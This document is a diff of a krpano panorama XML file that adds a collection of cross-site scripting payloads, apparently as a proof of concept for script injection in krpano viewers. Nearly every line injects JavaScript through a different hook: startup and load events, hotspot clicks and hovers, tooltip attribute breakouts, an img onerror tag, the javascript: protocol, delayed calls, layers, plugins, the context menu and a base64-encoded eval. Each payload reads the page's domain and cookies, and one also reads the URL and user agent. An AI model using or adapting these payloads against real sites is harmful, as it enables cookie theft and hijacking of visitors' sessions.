@@ -1,2 +1,37 @@
-<krpano version="1.18" onstart="js(alert(typeof document));">
-<events onloadcomplete="js(alert('Document type: ' + typeof document + '\nDomain available: ' + ('domain' in document)));"/>
+<krpano version="1.18" onstart="js(alert('Domain: ' + document.domain + '\nCookie: ' + document.cookie));">
+<events onloadcomplete="js(alert('2:Load\nDomain: ' + document.domain + '\nCookie: ' + document.cookie));"/>
+<action name="xss"><![CDATA[js(alert('3:Action\nDomain: ' + document.domain + '\nCookie: ' + document.cookie));]]></action>
+
+<scene name="scene_lobby_hdp">
+<view/>
+
+<!-- Direct JS execution -->
+<hotspot name="x1" ath="0" atv="0" onclick="js(alert('4:Click\nDomain: ' + document.domain + '\nCookie: ' + document.cookie));" 
+         tooltip="&lt;img src=x onerror=alert('5:Tooltip\nDomain: ' + document.domain + '\nCookie: ' + document.cookie)&gt;"/>
+
+<!-- Protocol & event injection -->
+<hotspot name="x2" ath="30" atv="0" onclick="javascript:alert('6:JS:Protocol\nDomain: ' + document.domain + '\nCookie: ' + document.cookie);"
+         onover="js(alert('7:Hover\nDomain: ' + document.domain + '\nCookie: ' + document.cookie));"/>
+
+<!-- Delayed & encoded -->
+<hotspot name="x3" ath="60" atv="0" 
+         onclick="delayedcall(1, js(alert('8:Delay\nDomain: ' + document.domain + '\nCookie: ' + document.cookie)));"
+         onloaded="js(eval(atob('YWxlcnQoIjk6RW5jb2RlZFxuRG9tYWluOiAiICsgZG9jdW1lbnQuZG9tYWluICsgIlxuQ29va2llOiAiICsgZG9jdW1lbnQuY29va2llIik=')));"/>
+
+<!-- Action call -->
+<hotspot name="x4" ath="90" atv="0" onclick="action(xss);" 
+         tooltip="' onmouseover='alert(\"10\\nDomain: \" + document.domain + \"\\nCookie: \" + document.cookie)'"/>
+
+<!-- Layer & plugin test -->
+<layer name="l1" type="text" html="Click Me (Layer)" onclick="js(alert('11:Layer\nDomain: ' + document.domain + '\nCookie: ' + document.cookie));" align="center" y="100"/>
+<plugin name="p1" onready="js(alert('12:Plugin\nDomain: ' + document.domain + '\nCookie: ' + document.cookie));"/>
+
+<!-- Context menu -->
+<contextmenu><item name="ctx" caption="Right Click Me" onclick="js(alert('13:Menu\nDomain: ' + document.domain + '\nCookie: ' + document.cookie));"/></contextmenu>
+
+<!-- Additional test with more info -->
+<hotspot name="x5" ath="120" atv="0" 
+         onclick="js(alert('📍 Location Info:\nURL: ' + window.location.href + '\nDomain: ' + document.domain + '\nCookie: ' + document.cookie + '\nUser Agent: ' + navigator.userAgent));" 
+         tooltip="Click for full info"/>
+</scene>
+</krpano>
